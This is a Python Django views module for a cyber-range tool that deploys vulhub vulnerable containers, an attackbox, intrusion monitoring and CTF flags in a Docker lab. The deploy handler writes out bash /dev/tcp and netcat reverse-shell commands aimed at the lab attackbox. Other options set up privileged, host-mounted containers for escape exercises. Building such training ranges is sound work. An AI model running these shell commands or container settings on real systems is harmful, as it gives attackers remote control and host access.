import re
import os
import git
import copy
import time
import json
import stat
import time
import yaml
import docker
import pickle
import random
import psutil
import shutil
import socket
import binascii
import markdown
import requests
import ipaddress
import subprocess
import collections
import cProfile


import networkx as nx
import multiprocessing as mp
from itertools import product
import plotly.graph_objects as go

from .forms import *
from .models import *
from .custom_containers import *
from markdown_view.views import *

from django.shortcuts import render

class scenario_template:
    def __init__(self, name):

        self.name = name
        self.selected_vulns = []
        self.selected_vulns_child_containers = dict()
        self.custom_vulhub_containers = []
        self.deployed_containers = []
        self.targetos="targetos:172.28.0.200"
        self.attackbox="attackbox:172.28.0.157"
        self.current_external_ip = "172.28.0.11"
        self.current_internal_ip = "172.29.0.101"
        self.number_of_internal_containers = 0
        self.aux_containers_env = dict()
        self.added_containers = dict()
        self.assigned_containers = dict()
        self.container_logs_to_recover = ["attackbox"]
        self.connected_containers = [(self.attackbox,self.targetos)]
        self.graph_selected_target = ""
        self.container_nodes = []
        self.tcpdump_process_pid = 0
        self.listen_process_pid = 0
        self.dockerfile_to_edit = ""
        self.suggested_tag = ""
        self.selected_container = ""
        self.docker_compose_files = []
        #Keep these free by default for our own logging
        self.ports_in_use = [5601, 9200]

current_scenario = scenario_template("current")

loaded_scenario = scenario_template("loaded")

cve_string = ""

selected_vuln = ""
selected_cc = ""

filebeats_set = False
packetbeats_set = False
suricata_set = False
deployed = False

dir_path = os.path.dirname(os.path.realpath(__file__))

resource_file_path = "{}resource_files".format(dir_path.split("GUI")[0])

vulhub_dir = "{}/vulhub".format(resource_file_path.split("GUI")[0])

pcap_file = "capture_{}.pcap".format(time.strftime("%d%m%Y"))

docker_client = docker.DockerClient(base_url='unix://var/run/docker.sock')

api_client = docker.APIClient(base_url='unix://var/run/docker.sock')

# https://cve.circl.lu/api/cve/


def home(request):

    return render(request,'GUI/home.html')


def vulhubView(request):

    git_url = "https://github.com/vulhub/vulhub.git"

    if request.method == "POST":

        if not os.path.exists(vulhub_dir):
            os.makedirs(vulhub_dir)

        try:
            repo = git.Repo(vulhub_dir)
            origin = repo.remote(name='origin')
            origin.fetch()
            origin_master = origin.refs.master
            repo.git.reset('--hard', origin_master.commit)
        except git.InvalidGitRepositoryError:
            git.Repo.clone_from(git_url, vulhub_dir)

        os.remove("{}/cve_cwe_mappings.json".format(resource_file_path))

        os.remove("{}/cwe_data.json".format(resource_file_path))

    cwe_dict = dict()

    cve_cwe_dict = dict()

    cve_cwe_dict["Multiple Services"] = dict()
    cve_cwe_dict["Single Services"] = dict()

    if os.path.isfile("{}/cve_cwe_mappings.json".format(resource_file_path)):

        with open("{}/cve_cwe_mappings.json".format(resource_file_path), 'r') as fp:
            cve_cwe_dict = json.load(fp)

    else:

        if os.path.isfile("{}/cwe_data.json".format(resource_file_path)):

            cwe_json = json.loads(open("{}/cwe_data.json".format(resource_file_path), "r").read())

        else:

            cwe_r = requests.get("https://cve.circl.lu/api/cwe")

            with open("{}/cwe_data.json".format(resource_file_path), "w") as f:
                json.dump(cwe_r.json(), f)

            cwe_json = json.loads(open("{}/cwe_data.json".format(resource_file_path), "r").read())

        for i in cwe_json:
            cwe_dict[i["id"]] = i

        for root, dirs, files in os.walk(vulhub_dir):
            for dir in dirs:
                match = re.search(r"CVE[-]\d*[-]\d*", dir)
                current_dir = os.path.join(root, dir)

                dcf_file = any(f == ("docker-compose.yml") for f in os.listdir(current_dir))

                vuln_dir_path = os.path.join(root,dir).replace("//","/")
                temp = vuln_dir_path.split("vulhub/")[1]
                software = temp.split("/")[0]

                if match:
                    cve = match.group()
                    cve_r = requests.get("https://cve.circl.lu/api/cve/"+cve)
                    try:
                        cwe = cve_r.json()["cwe"]
                        cwe_id = str(cwe.split("-")[1])
                    except:
                        cwe_id = "Misc"

                    if not re.search(r'\d', cwe_id):
                        cwe_id = "Misc"
                    else:
                        cwe_id = "{}:{}".format(cwe,cwe_dict[cwe_id]["name"])

                    if cwe_id not in cve_cwe_dict:
                        cve_cwe_dict[cwe_id] = dict()

                    cve_cwe_dict[cwe_id]["{} - {}".format(software, cve)] = "vulhub/" + temp

                    if dcf_file:
                        with open("{}/docker-compose.yml".format(current_dir)) as dcf:
                            dcf_data = yaml.safe_load(dcf)

                        if len(list(dcf_data["services"].keys())) >= 2:
                            cve_cwe_dict["Multiple Services"]["{} - {}".format(software, cve)] = "vulhub/" + temp
                        else:
                            cve_cwe_dict["Single Services"]["{} - {}".format(software, cve)] = "vulhub/" + temp

                elif dcf_file:
                    cwe_id = "Misc"

                    if cwe_id not in cve_cwe_dict:
                        cve_cwe_dict[cwe_id] = dict()

                    cve_cwe_dict[cwe_id]["{} - {}".format(software, dir)] = "vulhub/" + temp

                    with open("{}/docker-compose.yml".format(current_dir)) as dcf:
                        dcf_data = yaml.safe_load(dcf)

                    if len(list(dcf_data["services"].keys())) >= 2:
                        cve_cwe_dict["Multiple Services"]["{} - {}".format(software, dir)] = "vulhub/" + temp
                    else:
                       cve_cwe_dict["Single Services"]["{} - {}".format(software, dir)] = "vulhub/" + temp

        with open("{}/cve_cwe_mappings.json".format(resource_file_path), 'w') as fp:
            json.dump(cve_cwe_dict, fp)

    context = {
        'vulnerabilities':collections.OrderedDict(sorted(cve_cwe_dict.items()))
    }

    return render(request,'GUI/vulhub.html',context)


def environmentView(request):
    global current_scenario
    global filebeats_set
    global packetbeats_set
    global suricata_set
    global deployed

    potential_target_containers = []

    # Default definition to avoid use before assignment errors
    selected_target = "target_1"

    if len(current_scenario.aux_containers_env) == 0:
        for key in aux_containers:
            current_scenario.aux_containers_env[key] = "Avaliable"

    for container in current_scenario.selected_vulns:
        container_vlun = container.split("vulhub")[1]
        current_scenario.added_containers[container_vlun]="External"

        dcf_data = yaml_data_from_docker_compose(container_vlun)[0]

        for service in dcf_data["services"]:
            current_scenario.selected_vulns_child_containers[service] = container_vlun

    if request.method == "POST":

        if "selected_target" in request.POST:
            selected_target = request.POST["selected_target"].replace("/","_").lower()

            selected_target_raw = request.POST["selected_target"]

        start_time = time.time()

        if "deploy" in request.POST:
            deployed = True

            traffic_target = request.POST["traffic_target"]

            auto_attack_target = request.POST["auto_attack_target"]

            target_os = request.POST["target_os"]

            filebeats = False
            packetbeats = False
            suricata = False
            pcap = False
            port_mirroring = False

            aux_depends_on = ""

            if "filebeats" in request.POST:
                filebeats = True

            if "packetbeats" in request.POST:
                packetbeats = True

            if "suricata" in request.POST:
                suricata = True

            if "pcap" in request.POST:
                pcap = True

            if "port_mirroring" in request.POST:
                port_mirroring = True

            dynamic_containers_sect = header_dc

            if current_scenario.graph_selected_target == "target_1":
                dynamic_containers_sect += target_sect.replace("target_os",target_os)

            if "mntd_volume" in request.POST:
                dynamic_containers_sect += f"""
      - path_replace/:/escape_dir
"""
            if "priv_container" in request.POST:
                dynamic_containers_sect += f"""
    privileged: true
"""
            if "root_user" in request.POST:
                dynamic_containers_sect += f"""
    user: root
"""

            if filebeats or packetbeats or suricata:

                dynamic_containers_sect += ek_containers_sect

            if filebeats and not filebeats_set:
                dynamic_containers_sect += filebeat_sect
                filebeats_set = True

                aux_depends_on = f"""
    depends_on:
      - elasticsearch
      - kibana
      - filebeat
"""

            if packetbeats and not packetbeats_set:
                dynamic_containers_sect += packetbeat_sect
                packetbeats_set = True


            if suricata and not suricata_set:
                if not filebeats:
                    dynamic_containers_sect += filebeat_sect

                addrs = psutil.net_if_addrs()

                suricata_interface = get_uwe_net_interface('1f72.28.0.1')

                dynamic_containers_sect += suricata_sect.replace("network_interface", suricata_interface)
                suricata_set = True

            dynamic_containers_sect = dynamic_containers_sect.replace("path_replace",resource_file_path)

            if traffic_target != "":
                traffic_generator_cmd = traffic_target.split(" ")

                temp = traffic_generator.replace("traffic_target", traffic_generator_cmd[0]).replace("endpoints", traffic_generator_cmd[1])

                temp += aux_depends_on

                dynamic_containers_sect += temp

            if auto_attack_target != "":
                auto_attack_cmd = auto_attack_target.split(" ")

                temp = auto_attack.replace("auto_attack_target", auto_attack_cmd[0]).replace("selected_scanners", auto_attack_cmd[1])

                temp += aux_depends_on

                dynamic_containers_sect += temp


            print("Deployment in Progress")

            deploy_containers(current_scenario, ["uwe_tek_external", "uwe_tek_internal"],dynamic_containers_sect, pcap, selected_target, port_mirroring, replace_subnet_dict=None, user_defined=False)

            if selected_target == "target_1":

                listen_cmd = "/bin/bash -i >& /dev/tcp/172.28.0.157/4242 0>&1"

                if target_os == "alpine":
                    listen_cmd = "nc 172.28.0.157 4242 -e /bin/ash"

                if current_scenario.listen_process_pid == 0:
                    listen_process = mp.Process(target=listen,args=("0.0.0.0",18200,listen_cmd,target_os, "goibhniuwe_target_1" ))

                    listen_process.start()

                    current_scenario.listen_process_pid = listen_process.pid

            containers_objects = docker_client.containers.list()
            running_containers = [x.name for x in containers_objects]

            shells = ["bash", "ash", "sh"]
            locations = ["/tmp/", "~/", "/var/www/html/"]

            combinations = list(product(shells, locations))

            flag_dict = dict()

            for container in containers_objects:

                container_name = container.name

                random_generator = random.SystemRandom()
                if container_name.__contains__("goibhniuwe__"):
                    for combo in combinations:
                        shell = combo[0]
                        location = combo[1]
                        flag = "UWE{" + f"FLAG_{format(random_generator.randint(0, 2**80 - 1), '020x')}" +"}"

                        result = container.exec_run(f'{shell} -c "echo {flag} > {location}flag.txt"')

                        if result.exit_code == 0:
                            flag_dict[container_name] = flag
                            break;

                if container_name.__contains__(selected_target):

                    container_pid = subprocess.check_output(["docker", "inspect", "--format", "{{.State.Pid}}", container_name], text=True).strip()

                    command = "nsenter --target {} --mount --uts --ipc --net --pid -- watch ps aux".format(container_pid)

                    ns_process = subprocess.run(['gnome-terminal', '--', 'bash', '-c', command], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

            print(flag_dict)

        end_time = time.time()

        elapsed_time = end_time - start_time

        print(elapsed_time)

        if "end_deployment" in request.POST:
            deployed = False
            pid_list = [current_scenario.tcpdump_process,current_scenario.listen_process_pid]

            for pid in pid_list:
                if pid != 0:
                    p = psutil.Process(pid)
                    p.terminate()

            output_fldr = "{}output_files/{}".format(dir_path.split("GUI")[0],time.strftime("%d-%m-%Y_%H%M"))

            log_clean_up(pcap_file,current_scenario.container_logs_to_recover,"logfiles",output_fldr)

        if "save_scenario" in request.POST:
            scenario_name=request.POST["save_scenario"]
            if scenario_name == "":
                scenario_name = "saved_scenario_{}".format(time.strftime("%d%m%Y"))

            current_scenario.name = scenario_name

            pkl_file = "{}/User_Defined_Scenarios/{}.pkl".format(resource_file_path,current_scenario.name)

            with open(pkl_file, 'wb') as pkl_dump:
                pickle.dump(current_scenario, pkl_dump, pickle.HIGHEST_PROTOCOL)


        if "internal_containers" in request.POST:
            changed_to_external = request.POST.getlist("internal_containers")

            for i in changed_to_external:
                current_scenario.added_containers[i] = "External"

        if "external_containers" in request.POST:
            changed_to_internal = request.POST.getlist("external_containers")


            for i in changed_to_internal:
                current_scenario.added_containers[i] = "Internal"

        if "avaliable_auxillary_containers" in request.POST:
            changed_to_selected = request.POST.getlist("avaliable_auxillary_containers")

            for i in changed_to_selected:
                current_scenario.aux_containers_env[i] = "Selected"
                current_scenario.added_containers[i]="External"

        if "selected_auxillary_containers" in request.POST:
            changed_to_avaliable = request.POST.getlist("selected_auxillary_containers")

            for i in changed_to_avaliable:
                current_scenario.aux_containers_env[i] = "Avaliable"
                del current_scenario.added_containers[i]

    external_containers=collections.OrderedDict(sorted({k: v for k,v in current_scenario.added_containers.items() if v == "External"}.items()))

    internal_containers=collections.OrderedDict(sorted({k: v for k,v in current_scenario.added_containers.items() if v == "Internal"}.items()))

    current_scenario.number_of_internal_containers = len(internal_containers)

    avaliable_auxillary_containers=collections.OrderedDict(sorted({k: v for k,v in current_scenario.aux_containers_env.items() if v == "Avaliable"}.items()))

    selected_auxillary_containers=collections.OrderedDict(sorted({k: v for k,v in current_scenario.aux_containers_env.items() if v == "Selected"}.items()))

    # Getting rid of duplicate nodes - Cleanup

    current_scenario.connected_containers = []

    if current_scenario.targetos in current_scenario.container_nodes:
        current_scenario.container_nodes.remove(current_scenario.targetos)

    if selected_target != "target_1":
        child_containers = [k for k,v in current_scenario.selected_vulns_child_containers.items() if v == selected_target_raw]

        child_container_service = child_containers[0].split('_')[-1]

        current_scenario.graph_selected_target = f"{selected_target_raw} - {child_container_service}"

    if current_scenario.number_of_internal_containers >= 1:

        if selected_target == "target_1":
            current_scenario.targetos="targetos:172.28.0.200/172.29.0.200"

        else:
            current_scenario.targetos=f"{current_scenario.graph_selected_target}:172.28.0.200/172.29.0.200"
            current_scenario.assigned_containers[current_scenario.graph_selected_target] = "172.28.0.200/172.29.0.200"

        current_scenario.connected_containers.append((current_scenario.attackbox,current_scenario.targetos))

    else:
        if current_scenario.targetos in current_scenario.container_nodes:
            current_scenario.container_nodes.remove(current_scenario.targetos)

        if selected_target == "target_1":
            current_scenario.targetos="targetos:172.28.0.200"

        else:
            current_scenario.targetos=f"{current_scenario.graph_selected_target}:172.28.0.200",
            current_scenario.assigned_containers[current_scenario.graph_selected_target] = "172.28.0.200"

        current_scenario.connected_containers.append((current_scenario.attackbox,current_scenario.targetos))

    previous_container = ""

    for container in internal_containers:

        if container in current_scenario.selected_vulns_child_containers.values():
            child_containers = [k for k,v in current_scenario.selected_vulns_child_containers.items() if v == container]

            for child_container in child_containers:
                child_container_service = child_container.split('_')[-1]
                graph_container = "{} - {}".format(container, child_container_service)
                container_ip_str = container_to_graph(current_scenario, graph_container, "172.29.0.0/24")

        else:
            container_ip_str = container_to_graph(current_scenario, container, "172.29.0.0/24")

        if previous_container != container_ip_str and previous_container != "":
            current_scenario.connected_containers.append((previous_container, container_ip_str))

        previous_container = container_ip_str

    previous_container = ""

    with open("{}/cve_cwe_mappings.json".format(resource_file_path), 'r') as fp:
        cve_cwe_dict = json.load(fp)

    single_service_containers = cve_cwe_dict["Single Services"].values()

    for container in external_containers:

        if f"vulhub{container}" in single_service_containers:
            potential_target_containers.append(container)

        if container in current_scenario.selected_vulns_child_containers.values():
            child_containers = [k for k,v in current_scenario.selected_vulns_child_containers.items() if v == container]

            for child_container in child_containers:
                child_container_service = child_container.split('_')[-1]
                graph_container = "{} - {}".format(container, child_container_service)

                if graph_container != current_scenario.graph_selected_target:
                    container_ip_str = container_to_graph(current_scenario, graph_container, "172.28.0.0/24")

        else:
            container_ip_str = container_to_graph(current_scenario, container, "172.28.0.0/24")

        if previous_container != container_ip_str and previous_container != "":
            current_scenario.connected_containers.append((previous_container, container_ip_str))

        previous_container = container_ip_str

        # Tidy up changes to container arrangement
        tuples_to_remove = []
        for tuple_item in current_scenario.connected_containers:
            remove_tuple = False
            for container in tuple_item:
                container_key_value = container.split(":")[0]
                container_ip_value = container.split(":")[1]

                if container_key_value == current_scenario.graph_selected_target and container_ip_value != "172.28.0.200/172.29.0.200":
                    #current_scenario.container_nodes.remove(container)
                    remove_tuple = True

            if remove_tuple:
                tuples_to_remove.append(tuple_item)

        for tuple_item in tuples_to_remove:
            current_scenario.connected_containers.remove(tuple_item)

    graph = create_Network_Graph(current_scenario.connected_containers,current_scenario.container_nodes)

    for container in set(current_scenario.deployed_containers):
        if container in external_containers.keys():
            del external_containers[container]

        if container in internal_containers.keys():
            del internal_containers[container]

    context = {
        'external_containers':external_containers,
        'internal_containers':internal_containers,
        'target_containers': potential_target_containers,
        'avaliable_auxillary_containers':avaliable_auxillary_containers,
        'selected_auxillary_containers':selected_auxillary_containers,
        'graph':graph,
        'deployed' : deployed
    }

    return render(request,'GUI/environment.html',context)


def userDefinedView(request):

    pkl_files = [x for x in os.listdir("{}/User_Defined_Scenarios".format(resource_file_path)) if x.endswith(".pkl")]

    context = {
        'pkl_files':pkl_files
    }

    return render(request,'GUI/userDefined.html',context)


def cveView(request):
    global current_scenario
    global selected_vuln
    global cve_string

    if "selected_cves" in request.POST:

        cve_string = request.POST["selected_cves"]

    if cve_string == "All":

        selected_cve_types = "All CVEs"

        with open("{}/cve_cwe_mappings.json".format(resource_file_path), 'r') as fp:
            cve_cwe_dict = json.load(fp)

        selected_cves = dict()

        for k, v in cve_cwe_dict.items():
            selected_cves.update(v)

    else:

        splt_string = cve_string.split("+")

        selected_cve_types = splt_string[0].strip()

        selected_cves = json.loads(splt_string[1].strip().replace("'","\""))


    if "vuln_path" in request.POST:

        if len(current_scenario.selected_vulns) == 0:

            current_scenario.selected_vulns = request.POST.getlist("vuln_path")

        else:
            temp = request.POST.getlist("vuln_path")
            for vuln in temp:
                if vuln not in current_scenario.selected_vulns:
                    current_scenario.selected_vulns.append(vuln)

    if "remove_vuln" in request.POST:

        vulns_to_remove = request.POST.getlist("remove_vuln")

        for vuln in vulns_to_remove:
            current_scenario.selected_vulns.remove("vulhub{}".format(vuln))

    if "selected_vuln" in request.POST:

        if selected_vuln not in current_scenario.selected_vulns:
            current_scenario.selected_vulns.append(selected_vuln)

    pp_selected_vulns = []

    for vuln in current_scenario.selected_vulns:
        pp_selected_vulns.append(vuln.split("vulhub")[1])


    sorted_keys = sorted(selected_cves.keys())
    ordered_selected_cves = {key: selected_cves[key] for key in sorted_keys}

    context = {
        'selected_cve_types':selected_cve_types,
        'selected_cves':ordered_selected_cves,
        'selected_vulns':pp_selected_vulns
    }

    return render(request,'GUI/cveList.html',context)


def readmeView(request):
    global selected_vuln

    selected_vuln = os.path.join(resource_file_path, request.POST["vuln_path"])

    readme_file = os.path.join(selected_vuln,"README.md")

    readme_str = ""

    with open(readme_file, 'r') as readme_f:
        for line in readme_f:
            readme_str += line

    files = os.listdir(selected_vuln)

    htmlmarkdown=markdown.markdown(readme_str)

    docker_files=dict()

    for f in files:
        # Django static file jiggery pokery required here
        if os.path.splitext(f)[1] in (".jpg", ".gif", ".png"):
            src=os.path.join(selected_vuln,f)
            dst="{}/{}/static/{}".format(selected_vuln.split("resource_files")[0],"GUI",f)
            shutil.copyfile(src, dst)
            htmlmarkdown = htmlmarkdown.replace(f,os.path.join("/static/",f))

            # nicely format the markdown images
            htmlmarkdown = htmlmarkdown.replace('<img ','<img class="card-img-top ')

        if f.lower().__contains__("docker"):
            docker_files[f.split(".")[0]]=f

    context = {
        'htmlmarkdown':htmlmarkdown,
        'docker_files':docker_files
    }

    return render(request, 'GUI/readme.html', context)


def dockerfileView(request):
    global selected_vuln

    selected_file = request.POST["selected_file"]

    docker_file = os.path.join(selected_vuln, selected_file)

    docker_f = open(docker_file, 'r')

    context = {
        'selected_file':docker_f.read()
    }

    return render(request, 'GUI/dockerfileView.html', context)


def local_docker_check(image):
    try:
        docker_client.images.get(image)
    except docker.errors.ImageNotFound:#
        print("{} not found locally - Pulling image".format(image))
        docker_client.images.pull(image)

        print("{} saved locally".format(image))

    return


def container_check(container_name, status_to_check=None):

    try:
        container = docker_client.containers.get(container_name)
        status = container.status
    except:
        return "removed"

    if status_to_check is not None:
        while status != status_to_check:
            time.sleep(5)
            status = container.status

    return status


def service_check(address):

    # Check the service status - Container may be running while microservice is still setting up
    response_status = 404

    while response_status != 200:
        try:
            response = requests.get(address)
        # If container/ service is "running" but not yet setup we get a connection error
        except:
            continue

        response_status = response.status_code

    return


def deploy_containers(scenario, required_networks, dynamic_containers_sect, pcap, selected_target, port_mirroring, replace_subnet_dict, user_defined):

    custom_dc_services = dict()

    selected_dict = dict()

    running_container_info = ""

    for req_network in required_networks:
        req_network_subnet = sub_network_check(req_network)

    for custom_container in scenario.assigned_containers:

        if custom_container == "auto_attack" or custom_container == "random_traffic":
            continue

        if custom_container in aux_containers.keys():
            selected_dict = aux_containers

        else:

            parent_container = custom_container.split(" ")[0]

            custom_dc_services.update(docker_compose_container_setup(scenario,parent_container, port_mirroring))

    dc_file_content = (
        dynamic_containers_sect +
        tail_dc
    )

    dc_file = "{}docker-compose.yml".format(dir_path.split("GUI")[0])

    with open(dc_file,'w') as dcf:
        dcf.write(dc_file_content)

    with open(dc_file) as dcf:
        dcf_data = yaml.safe_load(dcf)

    for service in custom_dc_services:
        if service.__contains__(selected_target):
            ipv4_addr = custom_dc_services[service]["networks"]["external"]["ipv4_address"]
            custom_dc_services[service]["networks"]["internal"] = {"ipv4_address":ipv4_addr.replace("28","29")}

            dcf_data["services"].pop("target")

        if dcf_data["services"] is None:
            dcf_data["services"] = {}

        dcf_data["services"][service] = custom_dc_services[service]

    for service in dcf_data["services"]:
    	if "image" in dcf_data["services"][service]:
            local_docker_check(dcf_data["services"][service]["image"])

    with open(dc_file,'w') as dcf_edited:
        yaml.safe_dump(dcf_data, dcf_edited)

    docker_compose_cmd = "docker-compose -f {} up -d".format(dc_file)

    dc_process = subprocess.run(['bash', '-c', docker_compose_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

    #print(dc_process.stderr)
    #print(dc_process.stdout)

    for k, v in required_containers.items():
        container_update=v[0]

        running_container_info += custom_container_setup(v[0],v[1],v[2],v[3])

        if k == "attackbox":
            # Testing something - but does also fix an issue with patator - So keeping until I fix the image
            cmd_create = api_client.exec_create(container_update.name, 'sed -i "s/fp.setopt(pycurl.RESOLVE/#fp.setopt(pycurl.RESOLVE/g" /usr/bin/patator')

            cmd_execute = api_client.exec_start(cmd_create, detach=True)

    cleanup_set = set(running_container_info.replace("None", "").split("\n"))

    print("----------------------------------------------------------------")
    for string in cleanup_set:
        print(string)
    print("----------------------------------------------------------------")

    if pcap:

        capture_output = "{}/{}".format(resource_file_path,pcap_file)

        os.umask(0)

        if not os.path.exists(capture_output):
            os.mknod(capture_output, mode = 0o666)

        tcpdump_process = subprocess.Popen(['tcpdump', '-i', 'any', '-w', capture_output, 'src', 'net', '172.28.0.0/15', 'and', 'dst', 'net', '172.28.0.0/15'],stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

        scenario.tcpdump_process = tcpdump_process.pid


def docker_compose_container_setup(scenario,container, port_mirroring):

    dcf_data = yaml_data_from_docker_compose(container)[0]
    original_docker_compose_file = yaml_data_from_docker_compose(container)[1]

    running_container_info = ""

    dcf_dir_path = os.path.dirname(original_docker_compose_file)
    #dcf_filename = os.path.basename(original_docker_compose_file)

    #dcf_original_data = copy.copy(dcf_data)

    for service in dcf_data["services"]:

        child_container_service = service.split('_')[-1]

        temp = "{} - {}".format(container,child_container_service)


        scenario.deployed_containers.append(container)

        if "networks" not in dcf_data["services"][service]:

            ipv4_addr = scenario.assigned_containers[temp]

            network_interface = ""

            if ipv4_addr.__contains__('/172.29'):

                external_ipv4_addr = ipv4_addr.split("/")[0]

                internal_ipv4_addr = ipv4_addr.split("/")[1]

                dcf_data["networks"] = {"external":{"name":"uwe_tek_external", "external": "true"}}
                dcf_data["networks"] = {"external":{"name":"uwe_tek_internal", "external": "true"}}

                dcf_data["services"][service]["networks"] = {"external":{"ipv4_address":external_ipv4_addr}, "internal":{"ipv4_address":internal_ipv4_addr}}

            else:
                if ipv4_addr.__contains__('172.29'):
                    network_interface = "internal"
                else:
                    network_interface = "external"

                dcf_data["networks"] = {"external":{"name":f"uwe_tek_{network_interface}", "external": "true"}}

                dcf_data["services"][service]["networks"] = {network_interface:{"ipv4_address":ipv4_addr}}

        else:
            if ipv4_addr.__contains__('/172.29'):
                dcf_data["services"][service]["networks"] = {"external":{"ipv4_address":external_ipv4_addr}}
                dcf_data["services"][service]["networks"] = {"internal":{"ipv4_address":internal_ipv4_addr}}
            else:
                ipv4_addr = dcf_data["services"][service]["networks"]["external"]["ipv4_address"]

        running_container_info += "{} is up and running and can be accessed on {}\n".format(temp,ipv4_addr)

        if "ports" in dcf_data["services"][service]:

            if port_mirroring:
                original_port_mapping = dcf_data["services"][service]["ports"]

                dcf_data["services"][service]["ports"] = []

                for port_pair in original_port_mapping:
                    exposed_port = int(port_pair.split(":")[0])
                    container_port = port_pair.split(":")[1]

                    port_free = False

                    while not port_free:
                        if is_port_in_use(exposed_port) or exposed_port in scenario.ports_in_use:
                            exposed_port += 1

                        else:
                            scenario.ports_in_use.append(exposed_port)
                            port_free = True

                    port_pair_to_use = f"{exposed_port}:{container_port}"

                    dcf_data["services"][service]["ports"].append(port_pair_to_use)
            else:
                del dcf_data["services"][service]["ports"]

        if "image" in dcf_data["services"][service]:
            local_docker_check(dcf_data["services"][service]["image"])

        if "volumes" in dcf_data["services"][service]:
            volumes = dcf_data["services"][service]["volumes"]
            path_corrected = [v.replace("./",dcf_dir_path + "/") for v in volumes]
            dcf_data["services"][service]["volumes"] = path_corrected

        if "build" in dcf_data["services"][service]:

            build = dcf_data["services"][service]["build"]

            if build == ".":
                dcf_data["services"][service]["build"] = dcf_dir_path + "/"

            else:
                path_corrected = build.replace("./",dcf_dir_path + "/")
                dcf_data["services"][service]["build"] = path_corrected

    return dcf_data["services"]



def custom_container_setup(Container, use_sdk, subprocess_list=[], on_running_cmds=[]):
    network_list = api_client.networks()

    if container_check(Container.name) != "running":

        local_docker_check(Container.image)

        if len(subprocess_list) >= 2:

            subprocess_type = subprocess_list[0]
            subprocess_cmd = subprocess_list[1]

            if subprocess_type == "run":
                subprocess.run(['gnome-terminal', '--', 'bash', '-c', subprocess_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

            if subprocess_type == "popen":
                subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', subprocess_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

        if use_sdk:

            if Container.name == "elasticsearch" or Container.name == "kibana":
                cpu_quota=100000
                mem_limit='2g'
            else:
                cpu_quota=50000
                mem_limit='1g'

            container = docker_client.containers.create(Container.image,
            detach=True,
            name=Container.name,
            user=Container.run_as_user,
            command=Container.command,
            environment=Container.environment,
            volumes=Container.volumes,
            cap_add=Container.capabilities,
            cpu_quota=cpu_quota,  # 50% of a single CPU core
            mem_limit='1g'    # 1 GB of memory
            )

            for network in network_list:
                if network["Name"].__contains__("uwe"):
                    network_subnet = network["IPAM"]["Config"][0]["Subnet"]
                    if ipaddress.IPv4Address(Container.ipv4_addr) in ipaddress.ip_network(network_subnet):
                        network_name = network["Name"]

            docker_client.networks.get(network_name).connect(Container.name,ipv4_address=Container.ipv4_addr)

            container.start()

        container_status = ""

        # Wait for container(s) to come online
        while container_status != "running":
            time.sleep(10)
            container_status = container_check(Container.name)

            if container_status == "created":
                container = docker_client.containers.get(Container.name)
                container.stop()
                container.remove()
                custom_container_setup(Container, use_sdk, subprocess_list, on_running_cmds)

        if Container.svc_check != None:
            service_check(Container.svc_check)

        if len(on_running_cmds) >= 1:
            for cmd in on_running_cmds:

                cmd_create = api_client.exec_create(Container.name, cmd)

                cmd_execute = api_client.exec_start(cmd_create, detach=True)

    return "{} is up and running and can be accessed on {}:{}\n".format(Container.image,Container.ipv4_addr,Container.default_port)


def yaml_data_from_docker_compose(container):

    docker_compose_file = ""

    files = ""

    if os.path.isdir("{}{}".format(vulhub_dir,container)):

        files = os.listdir("{}{}".format(vulhub_dir,container))

        for f in files:
            if f.lower().__contains__("compose"):
                docker_compose_file = "{}/{}/{}".format(vulhub_dir,container,f)

    if os.path.isdir("{}/Custom_Containers/custom_vulhub_containers/{}".format(resource_file_path,container)):

        files = os.listdir("{}/Custom_Containers/custom_vulhub_containers/{}".format(resource_file_path,container))

        for f in files:
            if f.lower().__contains__("compose"):
                docker_compose_file = "{}/Custom_Containers/custom_vulhub_containers/{}/{}".format(resource_file_path,container,f)


    with open(docker_compose_file) as dcf:
        dcf_data = yaml.safe_load(dcf)

    suffix = container.replace("/", "_").lower()

    original_service_names = list(dcf_data['services'].keys())

    dcf_data["services"] = {f"{suffix}_{key}": value for key, value in dcf_data['services'].items()}

    for service in dcf_data["services"]:
        # if "environment" in dcf_data["services"][service]:
        #     for idx in range(len(dcf_data["services"][service]["environment"])):
        #         item_pair = dcf_data["services"][service]["environment"][idx]
        #         env_var = item_pair.split("=")[0]
        #         value = item_pair.split("=")[1]
        #         if env_var.__contains__("HOST") and value in original_service_names:
        #             dcf_data["services"][service]["environment"][idx] = f"{env_var}={suffix}_{value}"
        #     print(dcf_data["services"][service]["environment"])
        if "depends_on" in dcf_data["services"][service]:
            if type(dcf_data["services"][service]["depends_on"]) is list:
                for idx in range(len(dcf_data["services"][service]["depends_on"])):
                    item = dcf_data["services"][service]["depends_on"][idx]
                    if not item.__contains__(suffix):
                        dcf_data["services"][service]["depends_on"][idx] = f"{suffix}_{item}"

            if type(dcf_data["services"][service]["depends_on"]) is dict:
                keylist = list(dcf_data["services"][service]["depends_on"].keys())

                for key in keylist:
                    if not key.__contains__(suffix):
                        dcf_data["services"][service]["depends_on"][f"{suffix}_{key}"] = dcf_data["services"][service]["depends_on"].pop(key)

    return dcf_data, docker_compose_file


def container_to_graph(scenario,graph_container,network):

    container_ip_str = ""

    if graph_container in scenario.assigned_containers and ipaddress.IPv4Address(scenario.assigned_containers[graph_container]) in ipaddress.ip_network(network):
        container_ip_str = "{}:{}".format(graph_container,scenario.assigned_containers[graph_container])

    else:
        if network == "172.28.0.0/24":
            scenario.current_external_ip = str(ipaddress.IPv4Address(scenario.current_external_ip) +1)
            ip_assignment = scenario.current_external_ip

        if network == "172.29.0.0/24":
            scenario.current_internal_ip = str(ipaddress.IPv4Address(scenario.current_internal_ip) +1)
            ip_assignment = scenario.current_internal_ip

        container_ip_str = "{}:{}".format(graph_container,scenario.current_external_ip)

        scenario.assigned_containers[graph_container] = ip_assignment

    scenario.connected_containers.append((scenario.targetos, container_ip_str))

    if network == "172.28.0.0/24":
        scenario.connected_containers.append((scenario.attackbox, container_ip_str))

    return container_ip_str


def network_create(req_network, network_subnets):

    count = 28

    while True:
        req_network_subnet = "172.{}.0.0/24".format(str(count))

        if req_network_subnet not in network_subnets:
            break
        else:
            count += 1

    ipam_pool = docker.types.IPAMPool(subnet=req_network_subnet)

    ipam_config = docker.types.IPAMConfig(pool_configs=[ipam_pool])

    api_client.create_network(req_network,ipam=ipam_config)

